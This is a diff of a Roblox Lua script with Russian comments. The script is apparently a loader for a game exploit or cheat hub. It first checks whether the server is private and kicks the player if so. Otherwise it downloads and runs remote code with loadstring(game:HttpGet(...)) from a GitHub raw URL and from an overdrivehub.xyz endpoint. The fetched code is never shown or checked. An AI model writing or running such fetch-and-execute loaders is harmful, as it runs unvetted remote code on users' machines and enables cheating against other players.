@@ -1,7 +1,21 @@
--- Запускаем фоновый скрипт из GitHub в параллели
-task.spawn(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/ODHUBytb/All-need-xx-script-veshi/refs/heads/main/x%20script%20base%20no%20deleting"))()
-end)
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
--- Запускаем основной скрипт (может быть блокирующим)
-loadstring(game:HttpGet("https://api.overdrivehub.xyz/v1/auth"))()
+-- Проверяем, является ли сервер VIP (приватным)
+local isVIPServer = ReplicatedStorage.Remotes.Extras.IsVIPServer:InvokeServer()
+
+if isVIPServer == true then
+    LocalPlayer:Kick("Private Servers Not Supported, Please Use Script In Public Server")
+else
+    -- Здесь основной код скрипта для публичных серверов
+    print("Script is running on a public server!")
+    
+    -- Запускаем фоновый скрипт из GitHub в параллели
+    task.spawn(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/ODHUBytb/All-need-xx-script-veshi/refs/heads/main/x%20script%20base%20no%20deleting"))()
+    end)
+
+    -- Запускаем основной скрипт (может быть блокирующим)
+    loadstring(game:HttpGet("https://api.overdrivehub.xyz/v1/auth"))()
+end
